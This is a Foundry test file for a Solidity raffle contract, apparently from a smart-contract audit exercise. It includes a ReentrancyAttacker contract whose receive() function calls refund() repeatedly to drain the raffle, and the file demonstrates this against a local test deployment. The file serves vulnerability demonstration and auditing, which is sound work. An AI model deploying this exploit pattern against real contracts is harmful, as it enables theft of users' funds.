// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console2} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 enteranceFee = 1e18; //  1_000_000_000_000_000_000 = 1 Eth
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    event RaffleEnter(address[] newPlayers);

    function setUp() public {
        puppyRaffle = new PuppyRaffle(enteranceFee, feeAddress, duration);
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    // function test_EnterRaffleWithDuplicate() public {
    //     address[] memory newPlayers = new address[](0);
    //     // newPlayers[0] = playerOne;
    //     // newPlayers[1] = playerTwo;
    //     // newPlayers[2] = playerOne;
    //     vm.expectRevert("PuppyRaffle: Duplicate player");
    //     puppyRaffle.enterRaffle{value: 3 ether}(newPlayers);
    //     vm.expectEmit();
    // }

    function test_EmitRaffleEnterEvent() public {
        address[] memory newPlayers = new address[](2);
        newPlayers[0] = playerOne;
        newPlayers[1] = playerTwo;

        vm.expectEmit(false, false, false, true);

        emit RaffleEnter(newPlayers);

        puppyRaffle.enterRaffle{value: 2 ether}(newPlayers);
    }

    function test_attack() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;

        puppyRaffle.enterRaffle{value: enteranceFee * 4}(players);

        uint256 raffleBalanceBefore = address(puppyRaffle).balance;
        console2.log("Raffle Balance: ", uint256(raffleBalanceBefore));

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(
            puppyRaffle
        );

        uint256 attackerBalanceBefore = address(attackerContract).balance;
        console2.log("Attacker Balance: ", uint256(attackerBalanceBefore));

        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        //Attack
        vm.startPrank(attacker);
        attackerContract.attack{value: enteranceFee}();
        vm.stopPrank();

        uint256 raffleBalanceAfter = address(puppyRaffle).balance;
        uint256 attackerBalanceAfter = address(attackerContract).balance;

        console2.log("Raffle Balance After: ", uint256(raffleBalanceAfter));
        console2.log("Attacker Balance After: ", uint256(attackerBalanceAfter));
    }
}

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 enteranceFee;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        enteranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory attackers = new address[](1);
        attackers[0] = address(this);
        puppyRaffle.enterRaffle{value: enteranceFee}(attackers);
        puppyRaffle.refund(4);
    }

    receive() external payable {
        if (address(puppyRaffle).balance > 0 ether) {
            puppyRaffle.refund(4);
        }
    }
}
